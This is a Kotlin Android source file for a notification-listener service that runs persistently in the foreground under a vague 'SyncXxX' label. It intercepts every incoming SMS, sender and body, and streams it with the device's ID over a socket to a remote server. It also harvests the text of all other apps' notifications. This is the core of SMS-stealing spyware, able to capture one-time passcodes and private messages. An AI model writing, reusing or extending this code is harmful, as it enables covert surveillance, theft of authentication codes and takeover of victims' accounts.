package com.fantzy.nih

import android.app.Notification
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject

class SmsNotifService : NotificationListenerService() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                "notif_listener_channel",
                "Notif Listener Service",
                android.app.NotificationManager.IMPORTANCE_LOW
            )
            val nm = getSystemService(android.app.NotificationManager::class.java)
            nm.createNotificationChannel(channel)
            
            val notif = android.app.Notification.Builder(this, "notif_listener_channel")
                .setContentTitle("SyncXxX")
                .setContentText("Memantau notifikasi...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()
                
            startForeground(101, notif)
        }
        return START_STICKY
    }

    companion object {
        fun isEnabled(ctx: android.content.Context): Boolean {
            val flat = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            return flat.contains(ctx.packageName)
        }
    }

    private var smsReceiver: BroadcastReceiver? = null

    override fun onCreate() {
        super.onCreate()
        registerSmsReceiver()
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(smsReceiver) } catch (_: Exception) {}
    }

    private fun registerSmsReceiver() {
        smsReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
                    try {
                        val bundle = intent.extras ?: return
                        val pdus = bundle.get("pdus") as? Array<*> ?: return
                        val format = bundle.getString("format")

                        for (pdu in pdus) {
                            val smsMessage = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                                android.telephony.SmsMessage.createFromPdu(pdu as ByteArray, format)
                            } else {
                                @Suppress("DEPRECATION")
                                android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
                            }

                            val from = smsMessage.displayOriginatingAddress ?: ""
                            val body = smsMessage.displayMessageBody ?: ""
                            
                            if (body.isNotBlank()) {
                                val payload = JSONObject().apply {
                                    put("pkg", "com.android.sms")
                                    put("appName", "SMS")
                                    put("title", from)
                                    put("text", body)
                                    put("time", System.currentTimeMillis())
                                }

                                sendBroadcast(Intent("com.fantzy.nih.NEW_NOTIF").apply {
                                    setPackage(packageName)
                                    putExtra("payload", payload.toString())
                                })

                                try {
                                    val socket = SocketHolder.socket
                                    if (socket != null && socket.connected()) {
                                        socket.emit("device:sms_realtime", JSONObject().apply {
                                            put("deviceId", getMyDeviceId())
                                            put("sms", payload)
                                        })
                                    }
                                } catch (_: Exception) {}
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("SmsNotifService", "SMS Error: ${e.message}")
                    }
                }
            }
        }

        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(smsReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(smsReceiver, filter)
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return
        if (pkg == packageName) return

        try {
            val extras = sbn.notification?.extras ?: return
            val title  = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            
            var text = ""

            val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            if (!normalText.isNullOrBlank()) text = normalText

            if (text.isBlank()) {
                val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                if (lines != null && lines.isNotEmpty()) {
                    text = lines.lastOrNull()?.toString() ?: ""
                }
            }

            if (text.isBlank()) {
                text = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
            }

            if (text.isBlank()) {
                text = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: ""
            }

            if (text.isBlank()) return

            val appName = try {
                packageManager.getApplicationLabel(
                    packageManager.getApplicationInfo(pkg, 0)
                ).toString()
            } catch (_: Exception) { pkg }

            val payload = JSONObject().apply {
                put("pkg", pkg)
                put("appName", appName)
                put("title", title)
                put("text", text)
                put("time", System.currentTimeMillis())
            }

            val intent = Intent("com.fantzy.nih.NEW_NOTIF").apply {
                setPackage(packageName)
                putExtra("payload", payload.toString())
            }
            sendBroadcast(intent)

        } catch (e: Exception) {
            Log.e("SmsNotifService", "Notif Error: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    private fun getMyDeviceId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (_: Exception) { "unknown" }
    }
}